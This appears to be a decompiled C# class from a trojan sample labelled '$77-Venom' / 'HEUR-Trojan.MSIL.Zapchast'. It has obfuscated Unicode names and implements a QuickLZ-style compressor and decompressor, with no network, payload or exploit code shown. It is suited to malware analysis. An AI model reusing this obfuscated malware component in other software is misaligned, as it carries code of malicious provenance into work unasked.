// Decompiled with JetBrains decompiler
// Type: ‫戾䓮ᒿ냕뚩钢㝻ఱ颎꙲대䟽Ⴑ㍶
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using System;

public static class \uF053‫\uE3AD戾\uF295䓮ᒿ냕뚩钢\uEB78㝻\uF56Fఱ颎\uA672대䟽Ⴑ\u3376
{
  public const int \uE6E1ꗩ\uEC57櫜\uABFF\uE5C5덇枮ᣇ㐧靜粩\uE004瑚垾峾敔Ꝙ䏥訚 = 1;
  public const int 撀様쌓ḧ\u222D迭鳻\u2806\u2E63깗밤\uFFFD\uE974礈\u09CA㩟\uEC5D\uE861偣敪 = 5;
  public const int ሉỗᔷ诶એ\uE50Dﮨﮢ軥䦝뷍쐈댱賈Ʃ\u25E3賚ு砡豕 = 0;
  public const int \uF7BE察锋\uF729韏䶳ᣗ鏫뒃窉\uF2C3鏡Ȅ笸폠琰ࠛ\uEAD1皛ೋ = 0;
  public const int 毰鯹府\u0F0B滀蠦\u2305롩ᙋ獏\uFFFD笎輋ꓴ뿳芅ᙹ諑ꊚ捫 = 0;
  private const int 跠\uFFFD\uEB9Cꄦ퀻껀气\u1F58\uF6EC쑞\uFFFDꌚ摇툹\u0886햣럙ᵲ̼鱘 = 4096;
  private const int 㑤\uFFFD捲眠쨂\uF814㟦\u1FCEଡ଼\uFFFD\uE535臢\u32DB峸쳤㰓箜칱臖ᑛ = 2;
  private const int \uE9D4ꨭ䬙손五潯\uFFFDⲂ雵\uE739\uFFFD\u2C2F药玪勬瓂民\u230F땮瘽 = 6;
  private const int 俪辺긮\u19F9\uE4BB뇐\u17F9ك욋䥐ꎁ\uF8D7ۭ삑ᡳ్ᢉ텟ꚫꚘ = 4;
  private const int ל蜽른ῢ뎂瓳\u2FA2䯵䀝䌲嘛슂鏦䉵䒞\u33B8ꬤࠛ킃송 = 4;
  private const int 猴物쑠猵\uA8F8行诃\u23B2寔鯘㹈衰\u2F52週\uE7D0ᗫﶃ죐食凉 = 9;
  private const int 倖ಞ罂\u268E튜욐គ儻㖏ཀ쏄\u2646䋺썩똨귔䮈蘁擻Ḟ = 1;
  private const int 㰡᩺\u295A맏媮鋞㐩摀杧蒠桍㷺\uEBDA戴Ꮐ켪깍\uAA78\uE1E7\uFFFD = 16;

  private static int \uEA36錕缅\u2411ؑ넃ࢥ\u009E䉧뮼ꆕ犨鯓ꣶ\u1BF8ᶜ䙊櫞\u086C诌(byte[] source) => ((int) source[0] & 2) != 2 ? 3 : 9;

  public static int 땺粤໖䑿\u083C즗鵭\uE07F掝\uF228鈻鱦\uF2BEᷩ넻ꦑ\uFFFDﳕ\uF432萴(byte[] source) => \uF053‫\uE3AD戾\uF295䓮ᒿ냕뚩钢\uEB78㝻\uF56Fఱ颎\uA672대䟽Ⴑ\u3376.\uEA36錕缅\u2411ؑ넃ࢥ\u009E䉧뮼ꆕ犨鯓ꣶ\u1BF8ᶜ䙊櫞\u086C诌(source) == 9 ? (int) source[5] | (int) source[6] << 8 | (int) source[7] << 16 | (int) source[8] << 24 : (int) source[2];

  public static int \u0880段ꠂຮ\uE7F4\uF1F4夻ᴉ瞚苢㮯㬟᮰\u0BBB곈铬핮抝汚萨(byte[] source) => \uF053‫\uE3AD戾\uF295䓮ᒿ냕뚩钢\uEB78㝻\uF56Fఱ颎\uA672대䟽Ⴑ\u3376.\uEA36錕缅\u2411ؑ넃ࢥ\u009E䉧뮼ꆕ犨鯓ꣶ\u1BF8ᶜ䙊櫞\u086C诌(source) == 9 ? (int) source[1] | (int) source[2] << 8 | (int) source[3] << 16 | (int) source[4] << 24 : (int) source[1];

  private static void 큳똄\u23C9\uE90D㛟霘瑌\uF086ﾋ螨\u32ED\uA70A都챒고\uFFFDꈭ៉\uF2E0\u2EDB(
    byte[] dst,
    int level,
    bool compressible,
    int sizeCompressed,
    int sizeDecompressed)
  {
    dst[0] = (byte) (2 | (compressible ? 1 : 0));
    dst[0] |= (byte) (level << 2);
    dst[0] |= (byte) 64;
    dst[0] |= (byte) 0;
    \uF053‫\uE3AD戾\uF295䓮ᒿ냕뚩钢\uEB78㝻\uF56Fఱ颎\uA672대䟽Ⴑ\u3376.뻺聄㝉毺銛ῇ\u0DFE\u2037뙵㝪竿櫣\u2443藤빟\uEA7F\uED76헛䈶䏝(dst, 1, sizeDecompressed, 4);
    \uF053‫\uE3AD戾\uF295䓮ᒿ냕뚩钢\uEB78㝻\uF56Fఱ颎\uA672대䟽Ⴑ\u3376.뻺聄㝉毺銛ῇ\u0DFE\u2037뙵㝪竿櫣\u2443藤빟\uEA7F\uED76헛䈶䏝(dst, 5, sizeCompressed, 4);
  }

  public static byte[] 戻\uE4C0뜆\u2309绤\u2A90詮㵭匏\u32D1㟆胗턭锐ᐷ\u0D81棷飡밵\uE95D(byte[] source, int level = 3)
  {
    if (source.Length == 0)
      return new byte[0];
    int[,] numArray1;
    if (level != 1)
    {
      if (level != 3)
        throw new ArgumentException("C# version only supports level 1 and 3");
      numArray1 = new int[4096, 16];
    }
    else
      numArray1 = new int[4096, 1];
    int index1 = 0;
    int length = 13;
    uint num1 = 2147483648;
    int i = 9;
    byte[] numArray2 = new byte[source.Length + 400];
    int[] numArray3 = new int[4096];
    byte[] numArray4 = new byte[4096];
    int num2 = 0;
    int num3 = source.Length - 6 - 4 - 1;
    int num4 = 0;
    if (index1 <= num3)
      num2 = (int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16;
    while (index1 <= num3)
    {
      if (((int) num1 & 1) == 1)
      {
        if (index1 > source.Length >> 1 && length > index1 - (index1 >> 5))
        {
          byte[] numArray5 = new byte[source.Length + 9];
          \uF053‫\uE3AD戾\uF295䓮ᒿ냕뚩钢\uEB78㝻\uF56Fఱ颎\uA672대䟽Ⴑ\u3376.큳똄\u23C9\uE90D㛟霘瑌\uF086ﾋ螨\u32ED\uA70A都챒고\uFFFDꈭ៉\uF2E0\u2EDB(numArray5, level, false, source.Length, source.Length + 9);
          Array.Copy((Array) source, 0, (Array) numArray5, 9, source.Length);
          return numArray5;
        }
        \uF053‫\uE3AD戾\uF295䓮ᒿ냕뚩钢\uEB78㝻\uF56Fఱ颎\uA672대䟽Ⴑ\u3376.뻺聄㝉毺銛ῇ\u0DFE\u2037뙵㝪竿櫣\u2443藤빟\uEA7F\uED76헛䈶䏝(numArray2, i, (int) (num1 >> 1) | int.MinValue, 4);
        i = length;
        length += 4;
        num1 = 2147483648U;
      }
      if (level == 1)
      {
        int index2 = (num2 >> 12 ^ num2) & 4095;
        int num5 = numArray1[index2, 0];
        int num6 = numArray3[index2] ^ num2;
        numArray3[index2] = num2;
        numArray1[index2, 0] = index1;
        if (num6 == 0 && numArray4[index2] != (byte) 0 && (index1 - num5 > 2 || index1 == num5 + 1 && num4 >= 3 && index1 > 3 && (int) source[index1] == (int) source[index1 - 3] && (int) source[index1] == (int) source[index1 - 2] && (int) source[index1] == (int) source[index1 - 1] && (int) source[index1] == (int) source[index1 + 1] && (int) source[index1] == (int) source[index1 + 2]))
        {
          num1 = num1 >> 1 | 2147483648U;
          if ((int) source[num5 + 3] != (int) source[index1 + 3])
          {
            int num7 = 1 | index2 << 4;
            numArray2[length] = (byte) num7;
            numArray2[length + 1] = (byte) (num7 >> 8);
            index1 += 3;
            length += 2;
          }
          else
          {
            int num8 = index1;
            int num9 = source.Length - 4 - index1 + 1 - 1 > (int) byte.MaxValue ? (int) byte.MaxValue : source.Length - 4 - index1 + 1 - 1;
            index1 += 4;
            if ((int) source[num5 + index1 - num8] == (int) source[index1])
            {
              ++index1;
              if ((int) source[num5 + index1 - num8] == (int) source[index1])
              {
                ++index1;
                while ((int) source[num5 + (index1 - num8)] == (int) source[index1] && index1 - num8 < num9)
                  ++index1;
              }
            }
            int num10 = index1 - num8;
            int num11 = index2 << 4;
            if (num10 < 18)
            {
              int num12 = num11 | num10 - 2;
              numArray2[length] = (byte) num12;
              numArray2[length + 1] = (byte) (num12 >> 8);
              length += 2;
            }
            else
            {
              \uF053‫\uE3AD戾\uF295䓮ᒿ냕뚩钢\uEB78㝻\uF56Fఱ颎\uA672대䟽Ⴑ\u3376.뻺聄㝉毺銛ῇ\u0DFE\u2037뙵㝪竿櫣\u2443藤빟\uEA7F\uED76헛䈶䏝(numArray2, length, num11 | num10 << 16, 3);
              length += 3;
            }
          }
          num2 = (int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16;
          num4 = 0;
        }
        else
        {
          ++num4;
          numArray4[index2] = (byte) 1;
          numArray2[length] = source[index1];
          num1 >>= 1;
          ++index1;
          ++length;
          num2 = num2 >> 8 & (int) ushort.MaxValue | (int) source[index1 + 2] << 16;
        }
      }
      else
      {
        num2 = (int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16;
        int num13 = source.Length - 4 - index1 + 1 - 1 > (int) byte.MaxValue ? (int) byte.MaxValue : source.Length - 4 - index1 + 1 - 1;
        int index3 = (num2 >> 12 ^ num2) & 4095;
        byte num14 = numArray4[index3];
        int num15 = 0;
        int num16 = 0;
        for (int index4 = 0; index4 < 16 && (int) num14 > index4; ++index4)
        {
          int index5 = numArray1[index3, index4];
          if ((int) (byte) num2 == (int) source[index5] && (int) (byte) (num2 >> 8) == (int) source[index5 + 1] && (int) (byte) (num2 >> 16) == (int) source[index5 + 2] && index5 < index1 - 2)
          {
            int num17 = 3;
            while ((int) source[index5 + num17] == (int) source[index1 + num17] && num17 < num13)
              ++num17;
            if (num17 > num15 || num17 == num15 && index5 > num16)
            {
              num16 = index5;
              num15 = num17;
            }
          }
        }
        int num18 = num16;
        numArray1[index3, (int) num14 & 15] = index1;
        byte num19 = (byte) ((uint) num14 + 1U);
        numArray4[index3] = num19;
        if (num15 >= 3 && index1 - num18 < 131071)
        {
          int num20 = index1 - num18;
          for (int index6 = 1; index6 < num15; ++index6)
          {
            num2 = (int) source[index1 + index6] | (int) source[index1 + index6 + 1] << 8 | (int) source[index1 + index6 + 2] << 16;
            int index7 = (num2 >> 12 ^ num2) & 4095;
            byte num21 = numArray4[index7]++;
            numArray1[index7, (int) num21 & 15] = index1 + index6;
          }
          index1 += num15;
          num1 = num1 >> 1 | 2147483648U;
          if (num15 == 3 && num20 <= 63)
          {
            \uF053‫\uE3AD戾\uF295䓮ᒿ냕뚩钢\uEB78㝻\uF56Fఱ颎\uA672대䟽Ⴑ\u3376.뻺聄㝉毺銛ῇ\u0DFE\u2037뙵㝪竿櫣\u2443藤빟\uEA7F\uED76헛䈶䏝(numArray2, length, num20 << 2, 1);
            ++length;
          }
          else if (num15 == 3 && num20 <= 16383)
          {
            \uF053‫\uE3AD戾\uF295䓮ᒿ냕뚩钢\uEB78㝻\uF56Fఱ颎\uA672대䟽Ⴑ\u3376.뻺聄㝉毺銛ῇ\u0DFE\u2037뙵㝪竿櫣\u2443藤빟\uEA7F\uED76헛䈶䏝(numArray2, length, num20 << 2 | 1, 2);
            length += 2;
          }
          else if (num15 <= 18 && num20 <= 1023)
          {
            \uF053‫\uE3AD戾\uF295䓮ᒿ냕뚩钢\uEB78㝻\uF56Fఱ颎\uA672대䟽Ⴑ\u3376.뻺聄㝉毺銛ῇ\u0DFE\u2037뙵㝪竿櫣\u2443藤빟\uEA7F\uED76헛䈶䏝(numArray2, length, num15 - 3 << 2 | num20 << 6 | 2, 2);
            length += 2;
          }
          else if (num15 <= 33)
          {
            \uF053‫\uE3AD戾\uF295䓮ᒿ냕뚩钢\uEB78㝻\uF56Fఱ颎\uA672대䟽Ⴑ\u3376.뻺聄㝉毺銛ῇ\u0DFE\u2037뙵㝪竿櫣\u2443藤빟\uEA7F\uED76헛䈶䏝(numArray2, length, num15 - 2 << 2 | num20 << 7 | 3, 3);
            length += 3;
          }
          else
          {
            \uF053‫\uE3AD戾\uF295䓮ᒿ냕뚩钢\uEB78㝻\uF56Fఱ颎\uA672대䟽Ⴑ\u3376.뻺聄㝉毺銛ῇ\u0DFE\u2037뙵㝪竿櫣\u2443藤빟\uEA7F\uED76헛䈶䏝(numArray2, length, num15 - 3 << 7 | num20 << 15 | 3, 4);
            length += 4;
          }
          num4 = 0;
        }
        else
        {
          numArray2[length] = source[index1];
          num1 >>= 1;
          ++index1;
          ++length;
        }
      }
    }
    while (index1 <= source.Length - 1)
    {
      if (((int) num1 & 1) == 1)
      {
        \uF053‫\uE3AD戾\uF295䓮ᒿ냕뚩钢\uEB78㝻\uF56Fఱ颎\uA672대䟽Ⴑ\u3376.뻺聄㝉毺銛ῇ\u0DFE\u2037뙵㝪竿櫣\u2443藤빟\uEA7F\uED76헛䈶䏝(numArray2, i, (int) (num1 >> 1) | int.MinValue, 4);
        i = length;
        length += 4;
        num1 = 2147483648U;
      }
      numArray2[length] = source[index1];
      ++index1;
      ++length;
      num1 >>= 1;
    }
    while (((int) num1 & 1) != 1)
      num1 >>= 1;
    \uF053‫\uE3AD戾\uF295䓮ᒿ냕뚩钢\uEB78㝻\uF56Fఱ颎\uA672대䟽Ⴑ\u3376.뻺聄㝉毺銛ῇ\u0DFE\u2037뙵㝪竿櫣\u2443藤빟\uEA7F\uED76헛䈶䏝(numArray2, i, (int) (num1 >> 1) | int.MinValue, 4);
    \uF053‫\uE3AD戾\uF295䓮ᒿ냕뚩钢\uEB78㝻\uF56Fఱ颎\uA672대䟽Ⴑ\u3376.큳똄\u23C9\uE90D㛟霘瑌\uF086ﾋ螨\u32ED\uA70A都챒고\uFFFDꈭ៉\uF2E0\u2EDB(numArray2, level, true, source.Length, length);
    byte[] destinationArray = new byte[length];
    Array.Copy((Array) numArray2, (Array) destinationArray, length);
    return destinationArray;
  }

  private static void 뻺聄㝉毺銛ῇ\u0DFE\u2037뙵㝪竿櫣\u2443藤빟\uEA7F\uED76헛䈶䏝(
    byte[] a,
    int i,
    int value,
    int numbytes)
  {
    for (int index = 0; index < numbytes; ++index)
      a[i + index] = (byte) (value >> index * 8);
  }

  public static byte[] ﻤᘂꉪ䫟媧\uFFFD鲊ｆ朊\uEACF\u2FEA궛\uEE28즋錄ꢅꌤ\uEBA3攐\uF658(byte[] source)
  {
    if (source.Length == 0)
      return new byte[0];
    int num1 = (int) source[0] >> 2 & 3;
    switch (num1)
    {
      case 1:
      case 3:
        int length = \uF053‫\uE3AD戾\uF295䓮ᒿ냕뚩钢\uEB78㝻\uF56Fఱ颎\uA672대䟽Ⴑ\u3376.땺粤໖䑿\u083C즗鵭\uE07F掝\uF228鈻鱦\uF2BEᷩ넻ꦑ\uFFFDﳕ\uF432萴(source);
        int index1 = \uF053‫\uE3AD戾\uF295䓮ᒿ냕뚩钢\uEB78㝻\uF56Fఱ颎\uA672대䟽Ⴑ\u3376.\uEA36錕缅\u2411ؑ넃ࢥ\u009E䉧뮼ꆕ犨鯓ꣶ\u1BF8ᶜ䙊櫞\u086C诌(source);
        int index2 = 0;
        uint num2 = 1;
        byte[] numArray1 = new byte[length];
        int[] numArray2 = new int[4096];
        byte[] numArray3 = new byte[4096];
        int num3 = length - 6 - 4 - 1;
        int index3 = -1;
        uint num4 = 0;
        if (((int) source[0] & 1) != 1)
        {
          byte[] destinationArray = new byte[length];
          Array.Copy((Array) source, \uF053‫\uE3AD戾\uF295䓮ᒿ냕뚩钢\uEB78㝻\uF56Fఱ颎\uA672대䟽Ⴑ\u3376.\uEA36錕缅\u2411ؑ넃ࢥ\u009E䉧뮼ꆕ犨鯓ꣶ\u1BF8ᶜ䙊櫞\u086C诌(source), (Array) destinationArray, 0, length);
          return destinationArray;
        }
        while (true)
        {
          if (num2 == 1U)
          {
            num2 = (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16 | (int) source[index1 + 3] << 24);
            index1 += 4;
            if (index2 <= num3)
              num4 = num1 != 1 ? (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16 | (int) source[index1 + 3] << 24) : (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16);
          }
          if (((int) num2 & 1) == 1)
          {
            num2 >>= 1;
            uint index4;
            uint num5;
            if (num1 == 1)
            {
              int index5 = (int) num4 >> 4 & 4095;
              index4 = (uint) numArray2[index5];
              if (((int) num4 & 15) != 0)
              {
                num5 = (uint) (((int) num4 & 15) + 2);
                index1 += 2;
              }
              else
              {
                num5 = (uint) source[index1 + 2];
                index1 += 3;
              }
            }
            else
            {
              uint num6;
              if (((int) num4 & 3) == 0)
              {
                num6 = (num4 & (uint) byte.MaxValue) >> 2;
                num5 = 3U;
                ++index1;
              }
              else if (((int) num4 & 2) == 0)
              {
                num6 = (num4 & (uint) ushort.MaxValue) >> 2;
                num5 = 3U;
                index1 += 2;
              }
              else if (((int) num4 & 1) == 0)
              {
                num6 = (num4 & (uint) ushort.MaxValue) >> 6;
                num5 = (uint) (((int) (num4 >> 2) & 15) + 3);
                index1 += 2;
              }
              else if (((int) num4 & (int) sbyte.MaxValue) != 3)
              {
                num6 = num4 >> 7 & 131071U;
                num5 = (uint) (((int) (num4 >> 2) & 31) + 2);
                index1 += 3;
              }
              else
              {
                num6 = num4 >> 15;
                num5 = (uint) (((int) (num4 >> 7) & (int) byte.MaxValue) + 3);
                index1 += 4;
              }
              index4 = (uint) ((ulong) index2 - (ulong) num6);
            }
            numArray1[index2] = numArray1[(int) index4];
            numArray1[index2 + 1] = numArray1[(int) index4 + 1];
            numArray1[index2 + 2] = numArray1[(int) index4 + 2];
            for (int index6 = 3; (long) index6 < (long) num5; ++index6)
              numArray1[index2 + index6] = numArray1[(long) index4 + (long) index6];
            index2 += (int) num5;
            if (num1 == 1)
            {
              uint num7 = (uint) ((int) numArray1[index3 + 1] | (int) numArray1[index3 + 2] << 8 | (int) numArray1[index3 + 3] << 16);
              while ((long) index3 < (long) index2 - (long) num5)
              {
                ++index3;
                int index7 = ((int) (num7 >> 12) ^ (int) num7) & 4095;
                numArray2[index7] = index3;
                numArray3[index7] = (byte) 1;
                num7 = (uint) ((ulong) (num7 >> 8 & (uint) ushort.MaxValue) | (ulong) ((int) numArray1[index3 + 3] << 16));
              }
              num4 = (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16);
            }
            else
              num4 = (uint) ((int) source[index1] | (int) source[index1 + 1] << 8 | (int) source[index1 + 2] << 16 | (int) source[index1 + 3] << 24);
            index3 = index2 - 1;
          }
          else if (index2 <= num3)
          {
            numArray1[index2] = source[index1];
            ++index2;
            ++index1;
            num2 >>= 1;
            if (num1 == 1)
            {
              while (index3 < index2 - 3)
              {
                ++index3;
                int num8 = (int) numArray1[index3] | (int) numArray1[index3 + 1] << 8 | (int) numArray1[index3 + 2] << 16;
                int index8 = (num8 >> 12 ^ num8) & 4095;
                numArray2[index8] = index3;
                numArray3[index8] = (byte) 1;
              }
              num4 = (uint) ((ulong) (num4 >> 8 & (uint) ushort.MaxValue) | (ulong) ((int) source[index1 + 2] << 16));
            }
            else
              num4 = (uint) ((ulong) (num4 >> 8 & (uint) ushort.MaxValue) | (ulong) ((int) source[index1 + 2] << 16) | (ulong) ((int) source[index1 + 3] << 24));
          }
          else
            break;
        }
        while (index2 <= length - 1)
        {
          if (num2 == 1U)
          {
            index1 += 4;
            num2 = 2147483648U;
          }
          numArray1[index2] = source[index1];
          ++index2;
          ++index1;
          num2 >>= 1;
        }
        return numArray1;
      default:
        throw new ArgumentException("C# version only supports level 1 and 3");
    }
  }
}
